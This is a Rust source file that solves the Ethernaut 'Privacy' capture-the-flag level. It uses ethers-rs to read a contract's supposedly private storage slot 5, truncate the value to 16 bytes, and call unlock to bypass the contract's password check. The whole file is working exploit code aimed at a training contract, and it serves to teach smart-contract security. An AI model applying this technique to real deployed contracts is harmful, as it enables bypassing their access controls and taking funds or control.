use async_trait::async_trait;
use ctf::ethernaut::lvl12_privacy::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Privacy::new(target.address, offender.clone());

        // number 5 as 32 bytes
        let mut array: [u8; 32] = [0; 32];
        array[31] = 5;

        //convert 5 to H256
        let hash = H256::from(array);

        //take data from slot 5
        let password =
            offender.get_storage_at(contract.address(), hash, None).await?;

        println!("hash: {}", hash);
        println!("array: {:?}", array);
        println!("password: {}", password);

        //convert data to 32 bytes
        let password_bytes_32 = *password.as_fixed_bytes();
        let mut password_bytes_16: [u8; 16] = [0; 16];

        //conver data to 16 bytes
        for i in 0..16 {
            password_bytes_16[i] = password_bytes_32[i]; //bytes 32 обрезаются слева направо, потому что читаются не как обычные числа, а как массив, который логично обрезать с 0 до 15 элемента, а не с 16 по 31
        }

        //unlock contract
        contract.unlock(password_bytes_16).send().await?;
        Ok(())
    }
}
